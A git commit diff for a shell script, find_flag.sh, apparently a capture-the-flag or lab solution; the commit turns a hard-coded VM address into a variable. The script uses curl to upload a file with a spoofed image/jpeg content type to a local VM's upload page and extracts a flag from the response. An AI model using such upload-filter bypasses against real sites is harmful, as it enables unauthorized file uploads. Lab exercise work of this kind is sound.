7e38f26cd056f5245387d9d459425c01b787b204
Drew Finnis <drewfinnis@gmail.com>
2021-03-23 16:02:32 +0100

    refacto/vm_ip as variable

--- File_upload/find_flag.sh
+++ File_upload/find_flag.sh
@@ -1,8 +1,10 @@
+vm_ip=192.168.0.21 ## Replace vm_ip with your ip
+
 touch inject.txt
 curl -s --form "Upload=send" \
 --header "Content-Type: multipart/form-data" \
 --form "uploaded=@inject.txt;type=image/jpeg" \
-http://192.168.0.15/?page\=upload \
+http://$vm_ip/?page\=upload \
 | grep flag \
 | head -c 120 | tail -c 78
 echo
